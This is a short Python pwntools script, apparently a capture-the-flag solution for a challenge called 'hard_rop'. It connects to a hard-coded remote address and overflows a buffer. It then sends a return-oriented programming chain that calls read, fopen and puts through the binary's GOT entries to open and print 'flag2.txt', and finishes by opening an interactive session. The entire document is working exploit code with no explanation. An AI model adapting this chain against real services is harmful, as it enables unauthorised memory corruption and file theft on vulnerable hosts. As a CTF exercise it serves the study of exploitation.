from pwn import *

#r = process('./hard_rop')
r = remote('106.10.34.139', 20002)

g1 = 0x4007c6
g2 = 0x4007b0
bss = 0x601100
read_got = 0x601020
fopen_got = 0x601040
puts_got = 0x601018

def call(func, arg1, arg2, arg3):
    rop = p64(g1) + p64(0) + p64(0) + p64(1) + p64(func) + p64(arg3) + p64(arg2) + p64(arg1)
    rop += p64(g2) + p64(0)*7
    return rop

payload = 'a'*0x18
payload += call(read_got, 0, bss, 0x20)
payload += call(fopen_got, bss, bss+0x10, 0)
payload += call(read_got, 3, bss, 0x100)
payload += call(puts_got, bss, 0, 0)

r.sendline(payload)


r.send('flag2.txt'.ljust(0x10, '\x00') + 'r\x00')

r.interactive()
